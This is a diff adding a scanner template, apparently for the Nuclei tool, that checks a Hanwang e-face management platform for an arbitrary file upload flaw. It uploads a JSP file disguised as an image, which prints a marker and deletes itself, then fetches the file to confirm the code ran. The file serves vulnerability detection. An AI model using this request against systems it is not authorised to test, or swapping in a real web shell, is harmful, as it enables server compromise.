@@ -1,0 +1,51 @@
+id: Hanwang-resourceUploadFile-File-upload
+
+info:
+  name: 汉王e脸通综合管理平台 resourceUploadFile.do任意文件上传
+  author: HuanXiong
+  severity: critical
+  description: |-
+
+  tags: File Upload
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        POST /manage/dgmCommand/resourceUploadFile.do?recoToken=ZuZBOrvLG8M HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Accept: */*
+        Connection: close
+        Content-Length: 310
+
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="file"; filename="{{username}}.jsp"
+        Content-Type: image/jpeg
+
+        <% out.println("pboyjnnrfipmplsukdeczudsefxmywe"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+
+      - |
+        GET /manage/resource/{{uploadfile}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
+
+    extractors:
+       - type: regex 
+         part: body
+         name: uploadfile
+         group: 1
+         regex:
+            - '([^\\]+\.jsp)' # 匹配32位hex字符串的jsp文件名
+         internal: true
+
+    matchers:
+      - type: dsl
+        name: 任意文件上传
+        dsl:
+          - "status_code == 200 && contains (body,'pboyjnnrfipmplsukdeczudsefxmywe')"
